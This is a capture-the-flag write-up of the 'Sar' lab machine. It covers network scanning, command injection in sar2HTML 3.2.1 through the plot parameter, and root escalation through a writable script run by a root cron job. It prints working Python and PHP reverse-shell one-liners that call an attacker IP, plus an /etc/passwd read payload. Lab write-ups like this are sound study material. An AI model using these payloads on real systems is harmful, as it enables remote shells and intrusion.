## Sar Exploit (easy)
- - - 
### Scanning
> netdiscover

> nmap -sS <ip range>

- identify open ports
- open ip address in browser
  * shows default Apache page
- run a directory brute force
> gobuster
- identifies robot.txt
  * text file says **sar2HTML**
  * try running in browser: http://ipaddress/sar2HTML/
  * shows that it is a tool running on the server
- - -
### Research
### You got to the research stage then stopped trusting yourself
- Research to find **sar2HTML** exploit
  * Exploit-DB shows Sar2HTML 3.2.1 has an RCE (no CVE)
  * Exploit = *http:192.168.1.24/sar2HTML/index.php?plot=;your-command*
    * Example: **http:192.168.1.24/sar2HTML/index.php?plot=; cat /etc/passwd**
- - - 
### Now I want a reverse shell
- At least a few options:
 1. Use Python or Perl command to take reverse shell
 2. Metaploit to create a reverse connectdion file and u pload it on target using wget 
 3. If target has NetCut utility, it can take the reverse connection

### Attempt NetCut utility
  - Run nc command to see if it has output
    - > nc -help
    - any return on output means it is available (does not work here)
### Attempt Python or Perl package
  - Run python help command to verify any output
    - > python3 --help
    - This works
  - Example command used with RCE:
    - > python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.20”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);
    - > nc -lvp 1234
  - Gain stable shell access:
    - > python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
  - **user flag can be found here** (/home/love/Desktop/user.txt)
- - -
### Gain Root
  - Find exploits based on OS and kernel versions
    - no luck
  - Check weak file permission and processes
    - Found a **cron job** is being run as a root user
      - > cat /etc/crontab
    - Cron job = ***/5 * * * * root cd /var/www/html/ && sudo ./finally.sh**
    - Navigate to /var/www/html/ and see what is there
      - finally.sh is calling write.sh
      - write.sh is create a folder in temp directory
      - the command **ls -l** shows we can edit write.sh
      - Add a php reverse connection command into write.sh
        * > php -r ‘$sock=fsockopen(“192.168.1.20”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
        * IP address = attacker machine (mine)
        * Setup listener **nc -lvp 4444**
        * Wait 5 mins for cron job
  - **root flag: cat /root/root.txt**

### Echo the php script into the write.sh file
- > echo "php -r '\$sock=fsockopen(\"192.168.57.200\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
- echo requires a \ in front of a $ and " (probably more)




